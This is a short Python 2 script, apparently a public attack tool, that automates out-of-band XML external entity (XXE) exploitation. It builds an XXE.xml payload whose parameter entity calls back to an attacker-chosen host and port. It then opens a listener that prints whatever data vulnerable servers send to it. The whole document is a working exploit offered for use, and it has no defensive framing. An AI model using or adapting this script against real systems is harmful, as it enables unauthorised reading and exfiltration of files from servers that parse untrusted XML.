import socket,urllib2

print """
 __  __   ___    _____
 \ \/ /  / _ \  | ____|
  \  /  | | | | |  _|
  /  \  | |_| | | |___
 /_/\_\  \___/  |_____|

# Exploit XXE OOB Vulnerability Easily
# Coded By karim Shoair | D4Vinci
# All Copyright To Squnity Company Team & Deveolopers
"""
HOST = raw_input("\nHost to listen : ")
PORT = raw_input("Port to listen : ")

"""
#Getting your public ip
u = urllib2.urlopen('http://checkip.dyndns.org')
line = u.next()
HOST =line.split("<")[6].split().pop()
"""

#Creating Xml file
xml="""<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://{}:{}/xml">
%remote;
%int;
%trick;]>
""".format(HOST,PORT)
a=open("XXE.xml","w")
print "[+]Created XXE.xml"
a.write(xml)
print "[+]Saved data to XXE.xml"

#listen to the server fart :D
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(2)
print "[+]Listening on "+str(HOST)+":"+str(PORT)+"\n"

while True:
    c,attacker= s.accept()
    port=attacker[1]
    ip=attacker[0]
    print "[#]Connection from "+str(ip)+":"+str(port)
    while True:
        data=c.recv(100000)
        print data
